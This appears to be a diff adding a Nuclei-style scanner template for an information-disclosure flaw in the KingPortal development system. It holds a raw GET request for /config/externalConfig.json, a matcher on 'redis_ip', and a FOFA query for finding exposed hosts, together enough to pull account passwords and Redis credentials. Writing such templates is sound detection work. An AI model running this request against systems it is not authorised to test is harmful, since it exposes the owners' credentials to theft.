@@ -1,0 +1,45 @@
+id: KingPortal-externalConfig-information-disclosure
+info:
+  name: KingPortal开发系统-externalConfig-信息泄露
+  author: candada
+  severity: high
+  description: 'KingPortal开发系统存在敏感信息泄露漏洞，攻击者可以通过漏洞访问接口获取系统账号密码、Redis地址及密码等敏感信息，从而影响系统正常运行。'
+  reference:
+  tags: 2024,北京亚控科技发展有限公司,information-disclosure
+  metadata:
+    max-request: 1
+    fofa-query: body="/public/javascripts/Common/Util/km_util.js"
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:  
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /config/externalConfig.json HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - redis_ip
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-05-07 10:12:55
